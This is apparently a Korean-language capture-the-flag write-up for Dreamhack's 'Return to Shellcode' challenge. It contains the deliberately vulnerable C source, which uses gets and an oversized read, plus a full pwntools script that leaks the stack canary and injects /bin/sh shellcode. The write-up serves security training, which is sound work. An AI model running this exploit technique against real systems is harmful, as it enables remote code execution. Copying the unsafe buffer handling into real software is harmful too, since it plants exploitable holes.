# Return to Shellcode - Dreamhack
## Challenge Info
- Date: 2025
- CTF Name: Dreamhack
- Category: pwn
- Difficulty (subjective): easy
- Points: 2
- Provided Files: r2c.c, r2c(ELF)
- tools: gdb(pwndbg)
## Brief Description
Exploit Tech: Return to Shellcode에서 실습하는 문제입니다.  
## Initial Analysis
### Environment
``` sh
checksec --file=r2s
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX unknown - GNU_STACK missing
PIE:        PIE enabled
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
```
### Code
``` c
// Name: r2s.c
// Compile: gcc -o r2s r2s.c -zexecstack

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  char buf[0x50];

  init();

  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n",
         (char*)__builtin_frame_address(0) - buf);

  printf("[1] Leak the canary\n");
  printf("Input: ");
  fflush(stdout);

  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);

  return 0;
}
```
### Buf addr & buf2rbp size
``` c
printf("Address of the buf: %p\n", buf);
printf("Distance between buf and $rbp: %ld\n", (char*)__builtin_frame_address(0) - buf);
// 이건 GCC에서 제공하는 빌트인 함수로, 현재 함수의 frame pointer(rbp)를 반환한다.
```
buf의 주소와 rbp까지의 거리를 출력한다.  
## Vulnerability
### BOF(Buffer Overflow)
``` c
// buf size 0x50
read(0, buf, 0x100); // greater than buf size
printf("Your input is '%s'\n", buf);
```
`buf`의 크기인 0x50을 초과하는 0x100을 입력받기 때문에 BOF 취약점이 발생한다. 또한 이후의 `printf` 함수에서 buf의 내용을 그대로 출력한다. BOF 취약점으로 `buf` 보다 상위 주소의 데이터를 덮어쓰고 읽어올 수 있다.  
``` c
puts("[2] Overwrite the return address");
printf("Input: ");
fflush(stdout);
gets(buf);
```
`gets` 함수로 인해서 두 번째 BOF 취약점이 발생한다. `buf` 보다 상위 주소의 데이터를 덮어 쓸 수 있다.  
## Exploit
### Strategy
해당 어플은 스택 카나리는 활성화 되어있지만, NX 보호 기법은 비활성화 되어있어 쉘코드를 삽입할 수 있다. 또한 두 번의 BOF 취약점이 존재하며, 첫 번재 BOF 취약점에서는 `buf` 보다 상위 주소의 데이터를 읽어올 수도 있다. 따라서 익스플로잇 전략은 다음과 같다.  
1. 첫 번째 BOF: (`buf`와 카나리 사이 공간 + 1) byte 만큼 쓰레기 값을 덮어 써, 카나리 값을 읽어온다. +1의 이유는 x86은 4byte, x86-64는 8byte의 카나리 값을 사용하는데 `LSB`에는 `NULL-byte`가 존재하기 때문에 `printf`로 읽어오기 위해서 해당 바이트를 제거한다. C 에서는 문자열의 끝을 판단하는 기준이 `NULL-byte이기 때문이다.
2. 두 번째 BOF: `buf`의 첫 부분에 `execve("/bin/sh")`의 쉘코드를 삽입하고, 더미 값과 카나리를 적절히 배치한 후, `ra` 위치에 `buf` 주소를 덮어쓰는 페이로드를 삽입한다.  
### Stack Frame of main
| Variable Name | Offset from EBP |
| --- | --- |
| ra | 0x8 |
| rbp |  |
| Canary | -0x8 |
| dummy | -0x10 |
| buf | -0x60 |
### payload
``` python
from pwn import *

p = remote('host1.dreamhack.games', 18829)
context.arch = "amd64"

# buf addr
p.recvuntil(b'buf: ')
buf_addr = int(p.recvline()[:-1], 16) 
log.info(f'buf addr: 0x{buf_addr}')

# buf2rbp
p.recvuntil(b'rbp: ')
buf2rbp = int(p.recvline().split()[0]) 
buf2cnry = buf2rbp - 8
log.info(f'buf2rbp: {buf2rbp}')

# canary leak
payload = b''
payload += b'A' * (buf2cnry + 1) # cover the canary null-byte
p.sendafter(b'Input: ', payload)
p.recvuntil(payload)
canary = u64(b'\x00' + p.recvn(7))
log.info(f'leaked canary: {canary}')

# exploit
sh = asm(shellcraft.sh())
payload = sh.ljust(buf2cnry, b'A') + p64(canary) + b'B' * 0x8 + p64(buf_addr)
p.sendlineafter(b'Input: ', payload)

# sh
p.interactive()
```